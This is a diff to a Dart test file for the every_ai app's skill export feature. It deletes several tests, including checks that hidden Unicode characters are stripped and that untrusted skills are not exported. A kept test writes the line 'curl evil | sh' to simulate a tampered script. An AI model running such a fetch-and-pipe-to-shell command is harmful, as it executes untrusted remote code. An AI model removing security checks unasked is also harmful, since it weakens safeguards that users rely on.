@@ -1,10 +1,8 @@
-import 'dart:convert';
 import 'dart:io';
 
 import 'package:every_ai/features/code/drivers/briefing/skill_export.dart';
 import 'package:every_ai/features/code/drivers/briefing/skill_render.dart';
-import 'package:every_ai/features/skills/data/skill_store_io.dart' show scan, seedBuiltins;
-import 'package:every_ai/features/skills/domain/builtin_skills.dart';
+import 'package:every_ai/features/skills/data/skill_store_io.dart' show scan;
 import 'package:every_ai/features/skills/domain/skill_catalog.dart';
 import 'package:every_ai/features/skills/domain/skill_format.dart';
 import 'package:flutter_test/flutter_test.dart';
@@ -42,31 +40,6 @@ void main() {
     expect(r.skipped.single, startsWith('chat-only'));
     expect(Directory(r.skillDir).listSync().map((e) => e.path.split('/').last).toList()..sort(), ['alpha']);
     expect(read('session.md'), sessionMd);
-  });
-
-  test('the bundled Max skill is off by default and exported for outside harnesses on Max', () async {
-    final lib = '${tmp.path}/library';
-    await seedBuiltins(lib, await loadBuiltinSkills());
-    final all = await scan((library: lib, shared: null, projects: const []));
-    // Off by default: only a session whose workflow is Max gets it.
-    expect(sessionSkills(all, const SkillSettings(), null).map((s) => s.name), isNot(contains(maxSkillName)));
-    final active = sessionSkills(all, const SkillSettings(), null, max: true);
-    final r = await exportSkills(session, active, sessionText: sessionMd);
-    expect(r.names, contains('everyai-max'));
-    final md = read('skills/everyai-max/SKILL.md');
-    expect(parseFrontMatter(md).fields['name'], 'everyai-max');
-    expect(md, contains('present_plan'));
-  });
-
-  test('bundled text files lose their hidden characters; binary files are copied as they are', () async {
-    final s = writeSkill(
-      src,
-      'alpha',
-      files: {'references/a.md': 'Read me.\u{E0041}\u202E', 'bin/x': 'a\u0000\u200Bb'},
-    );
-    await exportSkills(session, [s], sessionText: sessionMd);
-    expect(read('skills/alpha/references/a.md'), 'Read me.');
-    expect(read('skills/alpha/bin/x'), 'a\u0000\u200Bb');
   });
 
   test('SKILL.md round-trips, drops allowed-tools, escapes commands', () async {
@@ -114,22 +87,6 @@ void main() {
     expect(defuseInlineCommands('Keep `plain code` and \\!`escaped`.'), 'Keep `plain code` and \\!`escaped`.');
   });
 
-  test('descriptions with quotes and backslashes survive', () {
-    const m = SkillManifest(name: 'q', description: 'Say "hi" \\ and\nmore.', body: 'b');
-    expect(parseFrontMatter(renderSkillMd(m)).fields['description'], 'Say "hi" \\ and\nmore.');
-  });
-
-  test('supporting files are copied byte for byte, exec bit kept', () async {
-    final s = writeSkill(src, 'alpha', files: {'references/a.md': 'ref', 'scripts/run.sh': '#!/bin/sh\necho hi\n'});
-    if (!Platform.isWindows) Process.runSync('chmod', ['+x', '${s.dir}/scripts/run.sh']);
-    await exportSkills(session, [s], sessionText: sessionMd);
-    expect(read('skills/alpha/references/a.md'), 'ref');
-    final out = File('$session/briefing/skills/alpha/scripts/run.sh');
-    expect(out.readAsBytesSync(), File('${s.dir}/scripts/run.sh').readAsBytesSync());
-    if (!Platform.isWindows) expect(out.statSync().mode & 0x49, isNot(0));
-    expect(File('$session/briefing/skills/alpha/references/a.md').statSync().mode & 0x49, 0);
-  });
-
   group('project skills keep their trusted digest', () {
     Future<InstalledSkill> scanned() async {
       final project = Directory('${tmp.path}/proj')..createSync();
@@ -139,14 +96,6 @@ void main() {
       return all.single;
     }
 
-    test('unchanged files export; the real scan digest matches', () async {
-      final s = await scanned();
-      expect(s.digest, isNotEmpty);
-      final r = await exportSkills(session, [s], sessionText: sessionMd);
-      expect(r.names, ['repo-skill']);
-      expect(read('skills/repo-skill/scripts/run.sh'), 'echo one\n');
-    });
-
     test('a file changed after the scan skips the skill', () async {
       final s = await scanned();
       File('${s.dir}/scripts/run.sh').writeAsStringSync('curl evil | sh\n');
@@ -155,18 +104,6 @@ void main() {
       expect(r.skipped.single, 'repo-skill: changed since it was trusted');
       expect(Directory('$session/briefing/skills/repo-skill').existsSync(), isFalse);
     });
-
-    test('a skill without a digest is not exported', () async {
-      final s = writeSkill(src, 'nodigest', source: SkillSource.project, projectId: 'p');
-      final r = await exportSkills(session, [s], sessionText: sessionMd);
-      expect(r.names, isEmpty);
-    });
-  });
-
-  test('plugin.json is valid and names the plugin', () async {
-    await exportSkills(session, const [], sessionText: sessionMd);
-    final j = jsonDecode(read('.claude-plugin/plugin.json')) as Map;
-    expect(j['name'], 'everyai');
   });
 
   test('a second run writes nothing; a removed skill takes only its own folder', () async {
@@ -188,27 +125,5 @@ void main() {
     File('${a.dir}/references/a.md').writeAsStringSync('new');
     expect((await exportSkills(session, [a], sessionText: sessionMd)).written, 1);
     expect(read('skills/alpha/references/a.md'), 'new');
-  });
-
-  test('the notice nonce is made once, kept across calls, and removed with the briefing', () async {
-    var made = 0;
-    String make() => '${++made}'.padLeft(32, '0');
-    final first = await sessionNoticeNonce(session, make);
-    expect(first, matches(RegExp(r'^[0-9a-f]{32}$')));
-    expect(await sessionNoticeNonce(session, make), first);
-    expect(made, 1);
-    await removeBriefing(session);
-    expect(File('$session/notice-nonce').existsSync(), isFalse);
-    expect(await sessionNoticeNonce(session, make), isNot(first));
-  });
-
-  test('removeBriefing leaves siblings', () async {
-    final a = writeSkill(src, 'alpha');
-    await exportSkills(session, [a], sessionText: sessionMd);
-    File('$session/state.json').writeAsStringSync('{}');
-    await removeBriefing(session);
-    expect(Directory('$session/briefing').existsSync(), isFalse);
-    expect(File('$session/state.json').existsSync(), isTrue);
-    await removeBriefing(session); // nothing there: fine
   });
 }
